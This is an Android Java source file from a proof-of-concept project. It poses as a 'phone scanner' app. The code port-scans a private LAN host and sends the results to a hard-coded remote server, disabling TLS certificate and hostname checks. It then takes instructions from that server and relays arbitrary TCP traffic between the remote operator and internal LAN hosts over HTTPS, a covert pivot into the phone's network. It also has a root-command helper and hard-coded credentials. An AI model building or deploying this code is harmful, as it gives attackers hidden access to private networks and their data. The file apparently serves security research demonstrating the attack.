/*
 * https://github.com/H21lab/Android2PrivateLAN
 * Copyright 2020 Martin Kacer, All right reserved
 *
 * AGPL v3 license
 * See the AUTHORS in the distribution for a
 * full listing of individual contributors.
 *
 * This is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

package com.h21lab.phonescanner;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.SSLCertificateSocketFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.util.Base64;
import android.view.View;
import android.support.design.widget.NavigationView;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.nio.channels.ClosedChannelException;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLSession;


import java.nio.ByteBuffer;
import java.nio.channels.SelectableChannel;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.Iterator;

public class PhoneScannerActivity extends AppCompatActivity

		implements NavigationView.OnNavigationItemSelectedListener {

	private String TAG = PhoneScannerActivity.class.getSimpleName();

	final public HashMap<String, SocketsProxy> socketsProxy = new HashMap<String, SocketsProxy>();

	private BroadcastReceiver mMessageReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			// Get extra data included in the Intent
			String message = intent.getStringExtra("Message");

			TextView textView = (TextView) findViewById(R.id.text_box);
			textView.setText(message);
		}
	};

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_phone_secure);
		Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
		setSupportActionBar(toolbar);

		FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
		fab.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				Snackbar.make(view, "Querying Network Status ...", Snackbar.LENGTH_LONG)
						.setAction("Action", null).show();


				TextView textView = null;
				textView = (TextView) findViewById(R.id.text_box);

				String result = null;
				try {
					NetworkScan networkScan = new NetworkScan(socketsProxy);

					result = networkScan.execute().get();
					textView.setText(result);

				} catch (InterruptedException e) {
					e.printStackTrace();
				} catch (ExecutionException e) {
					e.printStackTrace();
				}

			}
		});

		DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
		ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
				this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
		drawer.setDrawerListener(toggle);
		toggle.syncState();

		NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
		navigationView.setNavigationItemSelectedListener(this);

	}

	@Override
	public void onBackPressed() {
		DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
		if (drawer.isDrawerOpen(GravityCompat.START)) {
			drawer.closeDrawer(GravityCompat.START);
		} else {
			super.onBackPressed();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.phone_secure, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();

		//noinspection SimplifiableIfStatement
		if (id == R.id.action_settings) {
			return true;
		}

		return super.onOptionsItemSelected(item);
	}

	@SuppressWarnings("StatementWithEmptyBody")
	@Override
	public boolean onNavigationItemSelected(MenuItem item) {
		// Handle navigation view item clicks here.
		int id = item.getItemId();

		if (id == R.id.nav_camera) {
			// Handle the camera action
		} else if (id == R.id.nav_gallery) {

		} else if (id == R.id.nav_slideshow) {

		} else if (id == R.id.nav_manage) {

		} else if (id == R.id.nav_share) {

		} else if (id == R.id.nav_send) {

		}

		DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
		drawer.closeDrawer(GravityCompat.START);
		return true;
	}

	private Uri ussdToCallableUri(String ussd) {

		String uriString = "";

		if (!ussd.startsWith("tel:"))
			uriString += "tel:";

		for (char c : ussd.toCharArray()) {

			if (c == '#')
				uriString += Uri.encode("#");
			else
				uriString += c;
		}

		return Uri.parse(uriString);
	}

	public String runAsRoot(String[] cmds) throws IOException, InterruptedException {
		Process p = Runtime.getRuntime().exec("su");
		DataOutputStream os = new DataOutputStream(p.getOutputStream());
		for (String tmpCmd : cmds) {
			os.writeBytes(tmpCmd + "\n");
		}
		os.writeBytes("exit\n");
		os.flush();


		BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

		StringBuilder total = new StringBuilder();
		String line;
		while ((line = reader.readLine()) != null) {
			total.append(line).append('\n');
		}

		reader.close();

		// Waits for the command to finish.
		p.waitFor();

		return total.toString();
	}


}

class SocketsProxy implements Runnable {

	String file = null;
	NetworkScan networkScan = null;
	public final AtomicBoolean running = new AtomicBoolean(false);
	Thread worker;

	byte[] file_data = null;

	SocketWorker socketWorker = null;

	public SocketsProxy(NetworkScan n, String f) {
		this.networkScan = n;
		this.file = f;

		try {
			socketWorker = new SocketWorker(file, networkScan);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public void start() {
		running.set(true);

		worker = new Thread(this);
		worker.start();

		if (socketWorker != null) {
			socketWorker.start();
		}
	}

	public void stop() {

		running.set(false);

		if (socketWorker != null) {
			socketWorker.stop();
		}
	}

	@Override
	public void run() {
		//code to do the HTTP request

		while (running.get()) {

			if (socketWorker != null) {
				// Getting data over HTTPs
				String s_file_data = "";
				try {
					s_file_data = networkScan.getData(networkScan.url + file.replaceAll("\"", "")).replaceAll("\"", "");
				} catch (Exception e) {
					try {
						Thread.sleep(1000);
					} catch (InterruptedException ex) {
						//ex.printStackTrace();
					}
				}


				if (!s_file_data.trim().isEmpty()) {
					System.out.println("RECEIVED_DATA = " + s_file_data);

					socketWorker.socket.fifo_in.add(s_file_data);
				}


				System.out.println("fifo_in.size() = " + String.valueOf(socketWorker.socket.fifo_in.size()));
				System.out.println("fifo_out.size() = " + String.valueOf(socketWorker.socket.fifo_out.size()));

				// Sending data over HTTPs
				while (socketWorker.socket.fifo_out.size() > 0) {

					String s = socketWorker.socket.fifo_out.poll();
					try {
						networkScan.sendData(networkScan.url + file.replaceAll("\"", ""), s, true);
					} catch (IOException e) {
						e.printStackTrace();
					}

				}

			}

		}

	}
}

class socketConnector {
	public ConcurrentLinkedQueue<String> fifo_in = new ConcurrentLinkedQueue<String>();
	public ConcurrentLinkedQueue<String> fifo_out = new ConcurrentLinkedQueue<String>();

	SocketWorker socketWorker = null;
	String server = null;
	int port = 0;

	public socketConnector(String s, int p, SocketWorker sockw) throws Exception {
		System.out.println("new P2PNIO");
		server = s;
		port = p;
		socketWorker = sockw;
	}

	public void run() {

	}
}

class socketConnectorHttp extends socketConnector {

	private Selector selector;

	ServerSocketChannel serverSocket;
	SocketChannel clientSocket = null;
	SelectableChannel channel = null;

	SocketWorker socketWorker = null;

	HashMap<SocketChannel, String> s_to_addr = new HashMap<SocketChannel, String>();
	HashMap<String, SocketChannel> addr_to_s = new HashMap<String, SocketChannel>();

	String server = null;
	int port = 0;
	//long timer = 0;

	public socketConnectorHttp(String s, int p, SocketWorker sockw) throws Exception {
		super(s, p, sockw);

		System.out.println("new P2PNIO");
		server = s;
		port = p;
		socketWorker = sockw;
	}

	public void run() {

		//System.out.println("LOOP: " + timmer);

		if (fifo_in.size() > 0 && server != null && port != 0) {
			Thread thread = new Thread() {
				public void run() {
					try {

						String s_file_data = fifo_in.peek();
						String client_address = s_file_data.split(":")[0];
						s_file_data = s_file_data.split(":")[1];

						System.out.println("WRITE  = " + s_file_data);
						if (s_file_data != null && !s_file_data.trim().isEmpty()) {
							System.out.println("WRITTTTTTTTTTTTTTTTE: " + s_file_data);
							byte[] file_data = Base64.decode(s_file_data, Base64.NO_WRAP);

							Socket socket = new Socket(server, port);
							socket.setSoTimeout(500);

							OutputStream output = socket.getOutputStream();

							output.write(file_data);
							output.flush();


							//timer = 0;
							fifo_in.poll();

							InputStream input = socket.getInputStream();
							DataInputStream dinput = new DataInputStream(input);


							System.out.println("READ START");
							int read = 0;
							byte[] data_received = new byte[256 * 4096];
							try {
								int res;
								while ((res = dinput.readUnsignedByte()) != -1) {
									data_received[read] = (byte) res;
									read++;
								}
							} catch (Exception e) {

							}

							System.out.println("read = " + String.valueOf(read));
							data_received = Arrays.copyOf(data_received, read);


							if (read > 0) {

								System.out.println("SEEEEEEEEEEND");
								String base64_data_received = Base64.encodeToString(data_received, Base64.NO_WRAP);
								System.out.println("data_received = " + new String(data_received));
								System.out.println("base64_data_received = " + Base64.encodeToString(data_received, Base64.DEFAULT));

								fifo_out.add(client_address + ":" + base64_data_received);

							}

							System.out.println("READ END");


							socket.close();

						}

					} catch (Exception ex) {

						System.out.println(ex.getMessage());

					}
				}
			};
			thread.start();
		}

		try {
			Thread.sleep(100);
			//this.timmer += 100;
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

}


class socketConnectorDefault extends socketConnector {

	private Selector selector;

	ServerSocketChannel serverSocket;
	SocketChannel clientSocket = null;
	SelectableChannel channel = null;

	SocketWorker socketWorker = null;

	HashMap<SocketChannel, String> s_to_addr = new HashMap<SocketChannel, String>();
	HashMap<String, SocketChannel> addr_to_s = new HashMap<String, SocketChannel>();

	String server = null;
	int port = 0;
	long timer = 0;

	String last_client_address = "";

	public socketConnectorDefault(String s, int p, SocketWorker sockw) throws Exception {
		super(s, p, sockw);

		System.out.println("new P2PNIO");
		server = s;
		port = p;
		socketWorker = sockw;
	}

	public void run() {

		System.out.println("LOOP: " + timer);

		if (channel == null && fifo_in.size() > 0 && server != null && port != 0) {
			try {

				clientSocket = SocketChannel.open();
				clientSocket.connect(new InetSocketAddress(server, port));
				channel = clientSocket;

				timer = 0;


				channel.configureBlocking(false);

				selector = Selector.open();
				System.out.println("channel.validOps(): " + channel.validOps());
				channel.register(selector, channel.validOps(), null);

			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		if (channel != null) {
			if ((fifo_in.size() > 0) && (!channel.isRegistered() || !channel.isOpen())) {
				try {
					clientSocket = SocketChannel.open();

					clientSocket.connect(new InetSocketAddress(server, port));
					channel = clientSocket;

					channel.configureBlocking(false);

					selector = Selector.open();
					channel.register(selector, channel.validOps(), null);
					System.out.println("REGISTER");
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

			try {
				System.out.println("SELECT");
				selector.select(10);
			} catch (IOException e) {
				e.printStackTrace();
			}

			Iterator<SelectionKey> iter = selector.selectedKeys().iterator();

			if (iter == null) {
				System.out.println("ITER NULL");
			}

			while (iter.hasNext()) {
				SelectionKey key = iter.next();
				iter.remove();

				System.out.println("ITER");

				if (!key.isValid()) {
					continue;
				}

				if (key.isConnectable()) {
					SocketChannel socketChannel = (SocketChannel) key.channel();


					try {
						socketChannel.finishConnect();
					} catch (IOException e) {

						System.out.println(e);
						key.cancel();
					}

				}

				if (key.isReadable()) {
					System.out.println("R");
					SocketChannel client = (SocketChannel) key.channel();

					ByteBuffer buffer = ByteBuffer.allocate(256 * 4096);

					int readLength = 0;

					try {
						readLength = client.read(buffer);
					} catch (IOException e) {
						e.printStackTrace();
					}

					if (readLength > 0) {

						System.out.println("SEEEEEEEEEEND");
						buffer.rewind();
						byte[] data_received = new byte[readLength];
						buffer.get(data_received, 0, readLength);
						String base64_data_received = Base64.encodeToString(data_received, Base64.NO_WRAP);
						System.out.println("base64_data_received = " + base64_data_received);

						timer = 0;

						if (s_to_addr.get(client) != null) {
							fifo_out.add(s_to_addr.get(client) + ":" + base64_data_received);
						} else {
							fifo_out.add(last_client_address + ":" + base64_data_received);
						}

					}
					try {
						channel.register(selector, SelectionKey.OP_WRITE, null);
					} catch (ClosedChannelException e) {
						e.printStackTrace();
					}

				}

				if (key.isWritable()) {
					System.out.println("W");

					SocketChannel client = (SocketChannel) key.channel();


					if (fifo_in.size() > 0) {
						String s_file_data = fifo_in.peek();
						String client_address = s_file_data.split(":")[0];
						last_client_address = client_address;
						s_to_addr.put(client, client_address);
						addr_to_s.put(client_address, client);
						s_file_data = s_file_data.split(":")[1];

						System.out.println("WRITE  = " + s_file_data);
						if (s_file_data != null && !s_file_data.trim().isEmpty()) {
							System.out.println("WRITTTTTTTTTTTTTTTTE: " + s_file_data);
							byte[] file_data = Base64.decode(s_file_data, Base64.NO_WRAP);

							if (client.isConnected()) {
								try {
									client.write(ByteBuffer.wrap(file_data));
									timer = 0;
									fifo_in.poll();


									channel.register(selector, SelectionKey.OP_READ, null);


								} catch (IOException e) {
									System.out.println("WRITE ERROR");
									try {
										client.close();
										channel.close();
									} catch (IOException ex) {
										//ex.printStackTrace();
									}
									//e.printStackTrace();
									break;
								}
							}

						} else {
							fifo_in.poll();
						}
					}

				}

			}
		}

		if (channel != null && timer >= 500 && timer < 2000) {
			try {
				channel.register(selector, SelectionKey.OP_READ, null);
			} catch (ClosedChannelException e) {
				e.printStackTrace();
			}
		}
		if (channel != null && timer >= 2000) {
			try {
				channel.register(selector, SelectionKey.OP_WRITE, null);
			} catch (ClosedChannelException e) {
				e.printStackTrace();
			}
		}

		if (timer > 10000) {
			// Nothing to send for long time, close socket
			if (channel != null) {
				try {
					SelectableChannel _channel = channel;
					channel = null;
					_channel.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}

		//System.out.println("LOOP: " + timmer);

		try {
			Thread.sleep(100);
			this.timer += 100;
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

}


class SocketWorker implements Runnable {

	public final AtomicBoolean running = new AtomicBoolean(false);
	Thread worker;

	socketConnector socket;

	private String file = null;
	private String h = null;
	private int p = 0;
	private NetworkScan networkScan = null;

	public SocketWorker(String f, NetworkScan n) throws Exception {

		this.file = f;
		if (file.lastIndexOf('/') >= 0 && file.lastIndexOf(':') >= 0) {
			this.h = file.substring(file.lastIndexOf('/') + 1, file.lastIndexOf(':'));
			this.p = Integer.parseInt(file.substring(file.lastIndexOf(':') + 1));
		}

		networkScan = n;
		if (p == 80) {
			socket = new socketConnectorHttp(h, p, this);
		} else {
			socket = new socketConnectorDefault(h, p, this);
		}
		running.set(true);
	}

	public void start() {
		worker = new Thread(this);
		worker.start();
	}

	public void stop() {
		running.set(false);
	}

	boolean sendData(String data) throws IOException {

		return networkScan.sendData(networkScan.url + file.replaceAll("\"", ""), data, true);
	}

	@Override
	public void run() {
		//code to do the Network operations

		while (running.get()) {

			if (socket != null) {


				try {
					socket.run();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}

		}

	}
}


class NetworkScan extends AsyncTask<Object, Void, String> {

	public String url = "";
	public HashMap<String, SocketsProxy> workers = null;
	private String ip = "";

	NetworkScan(HashMap<String, SocketsProxy> w) {
		this.workers = w;
	}

	/**
	 * Get IP address from first non-localhost interface
	 */
	public static String getIPAddress(boolean useIPv4) {
		try {
			List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
			for (NetworkInterface intf : interfaces) {
				List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
				for (InetAddress addr : addrs) {
					if (!addr.isLoopbackAddress()) {
						String sAddr = addr.getHostAddress();
						boolean isIPv4 = sAddr.indexOf(':') < 0;

						if (useIPv4) {
							if (isIPv4)
								return sAddr;
						} else {
							if (!isIPv4) {
								int delim = sAddr.indexOf('%'); // drop ip6 zone suffix
								return delim < 0 ? sAddr.toUpperCase() : sAddr.substring(0, delim).toUpperCase();
							}
						}
					}
				}
			}
		} catch (Exception ignored) {
		}
		return "";
	}

	@Override
	protected String doInBackground(Object... o) {

		String result = "";
		result = result + "Device IP = " + getIPAddress(true) + "\n";
		int ports[] = {22, 80};
		for (int ip = 20; ip < 21; ip++) {
			for (int p = 0; p < ports.length; p++) {
				String host = String.format("192.168.1.%d", ip);
				Socket socket = new Socket();
				try {
					socket.connect(new InetSocketAddress(host, ports[p]), 20);
					result = result + host + "    " + String.format("%d", ports[p]) + "/tcp open" + "\n";
					socket.close();
				} catch (SocketTimeoutException e) {
					//result = result + host + "    " + String.format("%d", port) + "/tcp closed" + "\n";
				} catch (Exception e) {
					//result = result + host + "    " + String.format("%d", port) + "/tcp ??????" + "\n";
					e.printStackTrace();
				} finally {
					try {
						socket.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
		}

		url = "https://35.228.53.192/";
		// Send scan
		boolean r = false;
		try {
			r = sendData(url, result, false);
		} catch (IOException e) {
			e.printStackTrace();
		}
		if (r) {
			result = result + "\nHTTP POST OK";
		}
		// Get public IP
		try {
			this.ip = getData(url).replaceAll("\"", "");
		} catch (IOException e) {
			e.printStackTrace();
		}
		result = result + "\nIP = " + this.ip;

		// Get files
		String files = null;
		try {
			files = getData(url + this.ip);
		} catch (IOException e) {
			e.printStackTrace();
		}
		result = result + "\nCMD = " + files;
		List<String> files_list = null;

		if (files != null && !files.equals("[]")) {
			files = files.replaceAll("\"", "").replaceAll("\\[", "").replaceAll("\\]", "").replaceAll(" ", "");
			files_list = Arrays.asList(files.split(","));
		}

		// Open connections

		if (files_list != null) {
			for (String file : files_list) {

				if (!workers.containsKey(file)) {
					SocketsProxy worker_client = new SocketsProxy(this, file);
					worker_client.start();
					workers.put(file, worker_client);
				}
				if (workers.containsKey(file)) {
					SocketsProxy worker_client = workers.get(file);
					worker_client.stop();
					workers.remove(worker_client);
					worker_client = new SocketsProxy(this, file);
					worker_client.start();
					workers.put(file, worker_client);
				}
			}
		}

		return result;
	}


	boolean sendData(String url, String data, boolean useHeader) throws IOException {
		// Send HTTPs
		HttpsURLConnection c = (HttpsURLConnection) new URL(url).openConnection();
		c.setHostnameVerifier(new HostnameVerifier() {
			@Override
			public boolean verify(String hostname, SSLSession session) {
				return true;
			}
		});
		c.setSSLSocketFactory(SSLCertificateSocketFactory.getInsecure(0, null));

		// Use this if you need SSL authentication
		String userpass = "authAUTH!@##@!" + ":" + "AUTHauth!@##@!";
		String basicAuth = "Basic " + Base64.encodeToString(userpass.getBytes(), Base64.DEFAULT);
		c.setRequestProperty("Authorization", basicAuth);

		c.setUseCaches(false);

		c.setDoOutput(true);
		c.setChunkedStreamingMode(0);

		c.setDoInput(false);
		c.setRequestMethod("POST");

		c.setRequestProperty("Content-Type", "application/json");

		c.setRequestProperty("Content-Length", Integer.toString(data.length()));


		if (useHeader) {
			c.setRequestProperty("Content-Length", Integer.toString("\r\n".length()));


			int j = 0;
			for (int i = 0; i < data.length(); i += 10000) {
				String chunk = data.substring(i, Math.min(i + 10000, data.length()));
				c.setRequestProperty("Data" + String.valueOf(j), chunk);
				System.out.println("Data" + String.valueOf(j) + ": " + chunk);
				j++;
			}

		} else {
			c.setRequestProperty("Content-Length", Integer.toString(data.length()));
		}

		OutputStream out = new BufferedOutputStream(c.getOutputStream());
		System.out.println("data_size = " + String.valueOf(data.length()));
		System.out.println(data);

		if (useHeader) {
			out.write("\r\n".getBytes());
		} else {
			out.write(data.getBytes());
		}

		out.flush();
		out.close();
		int responseCode = c.getResponseCode();

		System.out.println("POST Response Code :: " + responseCode);

		c.connect();

		c.disconnect();

		return true;

	}

	String getData(String url) throws IOException {
		String res = "";

		HttpsURLConnection c = (HttpsURLConnection) new URL(url).openConnection();
		c.setHostnameVerifier(new HostnameVerifier() {
			@Override
			public boolean verify(String hostname, SSLSession session) {
				return true;
			}
		});
		c.setSSLSocketFactory(SSLCertificateSocketFactory.getInsecure(0, null));

		// Use this if you need SSL authentication
		String userpass = "authAUTH!@##@!" + ":" + "AUTHauth!@##@!";
		String basicAuth = "Basic " + Base64.encodeToString(userpass.getBytes(), Base64.DEFAULT);
		c.setRequestProperty("Authorization", basicAuth);

		c.setUseCaches(false);

		c.setDoOutput(false);
		c.setChunkedStreamingMode(0);

		c.setDoInput(true);
		c.setRequestMethod("GET");


		InputStream in = new BufferedInputStream(c.getInputStream());
		BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
		for (String line; (line = r.readLine()) != null; ) {
			res += line;
		}

		int responseCode = c.getResponseCode();
		System.out.println("GET Response Code :: " + responseCode);

		c.connect();

		c.disconnect();

		return res;
	}


}
